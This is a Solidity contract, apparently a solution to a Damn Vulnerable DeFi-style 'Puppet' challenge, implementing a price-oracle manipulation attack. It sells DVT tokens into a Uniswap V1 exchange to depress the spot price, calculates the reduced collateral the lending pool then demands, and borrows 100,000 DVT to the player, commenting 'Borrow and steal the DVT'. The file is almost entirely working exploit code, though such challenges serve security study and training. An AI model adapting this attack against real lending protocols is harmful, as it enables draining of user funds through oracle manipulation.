// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
}

interface IPool {
    function borrow(uint256 amount, address recipient) external payable;
}


contract AttackPuppet {

    uint256 constant SELL_DVT_AMOUNT = 1000 ether;
    uint256 constant DEPOSIT_FACTOR = 2;
    uint256 constant BORROW_DVT_AMOUNT = 100000 ether;
    
    IUniswapExchangeV1 immutable exchange;
    IERC20 immutable token;
    IPool immutable pool;
    address immutable player;

    constructor(address _token, address _pair, address _pool){
        token = IERC20(_token);
        exchange = IUniswapExchangeV1(_pair);
        pool = IPool(_pool);
        player = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == player);

        // Dump DVT to the Uniswap Pool
        token.approve(address(exchange), SELL_DVT_AMOUNT);
        exchange.tokenToEthTransferInput(SELL_DVT_AMOUNT, 9, block.timestamp, address(this));

        // Calculate required collateral
        uint256 price = address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));
        uint256 depositRequired = BORROW_DVT_AMOUNT * price * DEPOSIT_FACTOR / 10 ** 18;

        console.log("contract ETH balance: ", address(this).balance);
        console.log("DVT price: ", price);
        console.log("Deposit Required: ", depositRequired);

        // Borrow and steal the DVT
        pool.borrow{value: depositRequired}(BORROW_DVT_AMOUNT, player);
    }

    receive() external payable {}
}